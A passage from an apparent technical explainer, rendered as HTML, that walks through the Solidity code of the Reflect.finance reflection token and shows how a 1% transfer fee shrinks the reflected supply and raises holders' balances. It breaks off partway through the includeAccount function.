</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="kt">function</span><span class="w"> </span><span class="nv">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">account</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span>override<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_isExcluded<span class="p">[</span>account<span class="p">])</span><span class="w"> </span><span class="kt">return</span><span class="w"> </span>_tOwned<span class="p">[</span>account<span class="p">];</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>tokenFromReflection<span class="p">(</span>_rOwned<span class="p">[</span>account<span class="p">]);</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="p">}</span>
</span></code></pre></div>
<p>Moreover, the address balance is not simply mapped as in the case of <code>balance</code>. Typically, it will be further calculated based on the value of <code>rOwned</code> using <code>tokenFromReflection</code>.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">tokenFromReflection</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>rAmount<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>_rTotal<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Amount must be less than total reflections&quot;</span><span class="p">);</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">currentRate</span><span class="w"> </span><span class="o">=</span><span class="w">  </span>_getRate<span class="p">();</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>rAmount<span class="p">.</span>div<span class="p">(</span>currentRate<span class="p">);</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="p">}</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getRate</span><span class="p">()</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rSupply</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tSupply</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getCurrentSupply<span class="p">();</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>rSupply<span class="p">.</span>div<span class="p">(</span>tSupply<span class="p">);</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="p">}</span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getCurrentSupply</span><span class="p">()</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rTotal<span class="p">;</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_tTotal<span class="p">;</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">    </span><span class="p">...</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>rSupply<span class="p">,</span><span class="w"> </span>tSupply<span class="p">);</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="p">}</span>
</span></code></pre></div>
<p>The <code>tokenFromReflection</code> function calculates a rate based on <code>rSupply</code> and <code>tSupply</code>, which allows the conversion of <code>rOwned</code> for an account address to the displayed balance quantity based on this rate.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transfer</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>sender<span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC20: transfer from the zero address&quot;</span><span class="p">);</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>recipient<span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC20: transfer to the zero address&quot;</span><span class="p">);</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>amount<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Transfer amount must be greater than zero&quot;</span><span class="p">);</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_isExcluded<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span>_isExcluded<span class="p">[</span>recipient<span class="p">])</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">        </span>_transferFromExcluded<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span>_isExcluded<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>_isExcluded<span class="p">[</span>recipient<span class="p">])</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">        </span>_transferToExcluded<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span>_isExcluded<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span>_isExcluded<span class="p">[</span>recipient<span class="p">])</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">        </span>_transferStandard<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_isExcluded<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>_isExcluded<span class="p">[</span>recipient<span class="p">])</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">        </span>_transferBothExcluded<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">        </span>_transferStandard<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="p">}</span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transferStandard</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getValues<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="w">    </span>_rOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>rAmount<span class="p">);</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="w">    </span>_rOwned<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>recipient<span class="p">].</span>add<span class="p">(</span>rTransferAmount<span class="p">);</span><span class="w">       </span>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="w">    </span>_reflectFee<span class="p">(</span>rFee<span class="p">,</span><span class="w"> </span>tFee<span class="p">);</span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>tTransferAmount<span class="p">);</span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="p">}</span>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getValues</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getTValues<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">currentRate</span><span class="w"> </span><span class="o">=</span><span class="w">  </span>_getRate<span class="p">();</span>
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getRValues<span class="p">(</span>tAmount<span class="p">,</span><span class="w"> </span>tFee<span class="p">,</span><span class="w"> </span>currentRate<span class="p">);</span>
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>rAmount<span class="p">,</span><span class="w"> </span>rTransferAmount<span class="p">,</span><span class="w"> </span>rFee<span class="p">,</span><span class="w"> </span>tTransferAmount<span class="p">,</span><span class="w"> </span>tFee<span class="p">);</span>
</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="p">}</span>
</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>
</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getTValues</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>pure<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tAmount<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tTransferAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tAmount<span class="p">.</span>sub<span class="p">(</span>tFee<span class="p">);</span>
</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>tTransferAmount<span class="p">,</span><span class="w"> </span>tFee<span class="p">);</span>
</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a><span class="p">}</span>
</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a>
</span><span id="__span-3-39"><a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_getRValues</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">currentRate</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>pure<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-40"><a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tAmount<span class="p">.</span>mul<span class="p">(</span>currentRate<span class="p">);</span>
</span><span id="__span-3-41"><a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tFee<span class="p">.</span>mul<span class="p">(</span>currentRate<span class="p">);</span>
</span><span id="__span-3-42"><a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTransferAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rAmount<span class="p">.</span>sub<span class="p">(</span>rFee<span class="p">);</span>
</span><span id="__span-3-43"><a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="p">(</span>rAmount<span class="p">,</span><span class="w"> </span>rTransferAmount<span class="p">,</span><span class="w"> </span>rFee<span class="p">);</span>
</span><span id="__span-3-44"><a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a><span class="p">}</span>
</span><span id="__span-3-45"><a id="__codelineno-3-45" name="__codelineno-3-45" href="#__codelineno-3-45"></a>
</span><span id="__span-3-46"><a id="__codelineno-3-46" name="__codelineno-3-46" href="#__codelineno-3-46"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_reflectFee</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rFee</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tFee</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-3-47"><a id="__codelineno-3-47" name="__codelineno-3-47" href="#__codelineno-3-47"></a><span class="w">    </span>_rTotal<span class="w"> </span><span class="o">=</span><span class="w"> </span>_rTotal<span class="p">.</span>sub<span class="p">(</span>rFee<span class="p">);</span>
</span><span id="__span-3-48"><a id="__codelineno-3-48" name="__codelineno-3-48" href="#__codelineno-3-48"></a><span class="w">    </span>_tFeeTotal<span class="w"> </span><span class="o">=</span><span class="w"> </span>_tFeeTotal<span class="p">.</span>add<span class="p">(</span>tFee<span class="p">);</span>
</span><span id="__span-3-49"><a id="__codelineno-3-49" name="__codelineno-3-49" href="#__codelineno-3-49"></a><span class="p">}</span>
</span></code></pre></div>
<p>During transfers, the values changed are those of <code>rOwned</code> by default. In a standard transfer scenario (i.e., not involving excluded addresses), <code>rAmount</code>, <code>rTransferAmount</code>, and <code>rFee</code> are first calculated based on the transfer amount <code>tAmount</code> and the current rate. Here, <code>rTransferAmount</code> represents 99% of the transfer amount, while <code>rFee</code> represents the remaining 1%. Subsequently, <code>_reflectFee</code> is called.</p>
<p>The reflection here is the core of the reflection token. According to the <code>_reflectFee</code> function, 1% of the transfer amount is reflected. In other words, <code>rTotal</code> is reduced by <code>rFee</code> with each transfer, functioning similarly to <code>burn</code> in ERC20. As <code>rTotal</code> decreases, <code>rSupply</code> decreases accordingly, causing the rate to decrease. With other users' <code>rOwned</code> remaining unchanged, their corresponding balance via <code>tokenFromReflection(rOwned)</code> increases, enabling them to receive more tokens.</p>
<p>That is, <code>rTotal</code> will decrease in each transfer (therefore this reflection token is also considered a deflationary token), causing the rate to continuously decrease and the corresponding balance of other holders to increase. As stated on their <a href="https://reflect.finance/">official website</a>: "RFI works by applying a 1% fee to each transaction and instantly splitting that fee among all holders of the token. Holders do not need to stake or wait for fees to be <strong>delivered</strong>. Fees are awarded by the smart contract and are immediately <strong>reflected</strong> in the holders balance."</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">reflect</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_msgSender<span class="p">();</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="o">!</span>_isExcluded<span class="p">[</span>sender<span class="p">],</span><span class="w"> </span><span class="s2">&quot;Excluded addresses cannot call this function&quot;</span><span class="p">);</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmount</span><span class="p">,,,,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_getValues<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">    </span>_rOwned<span class="p">[</span>sender<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rOwned<span class="p">[</span>sender<span class="p">].</span>sub<span class="p">(</span>rAmount<span class="p">);</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">    </span>_rTotal<span class="w"> </span><span class="o">=</span><span class="w"> </span>_rTotal<span class="p">.</span>sub<span class="p">(</span>rAmount<span class="p">);</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span>_tFeeTotal<span class="w"> </span><span class="o">=</span><span class="w"> </span>_tFeeTotal<span class="p">.</span>add<span class="p">(</span>tAmount<span class="p">);</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="p">}</span>
</span></code></pre></div>
<p>Apart from using a 1% fee for reflection during transfers, users can also call the <code>reflect</code> function to voluntarily "burn" their tokens.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">excludeAccount</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">account</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>onlyOwner<span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span><span class="o">!</span>_isExcluded<span class="p">[</span>account<span class="p">],</span><span class="w"> </span><span class="s2">&quot;Account is already excluded&quot;</span><span class="p">);</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="kt">if</span><span class="p">(</span>_rOwned<span class="p">[</span>account<span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">        </span>_tOwned<span class="p">[</span>account<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tokenFromReflection<span class="p">(</span>_rOwned<span class="p">[</span>account<span class="p">]);</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span>_isExcluded<span class="p">[</span>account<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span>_excluded<span class="p">.</span>push<span class="p">(</span>account<span class="p">);</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="p">}</span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="kt">function</span><span class="w"> </span><span class="nv">includeAccount</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">account</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>onlyOwner<span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>_isExcluded<span class="p">[</span>account<span class="p">],</span><span class="w"> </span><span class="s2">&quot;Account is already excluded&quot;</span><span class="p">);</span>
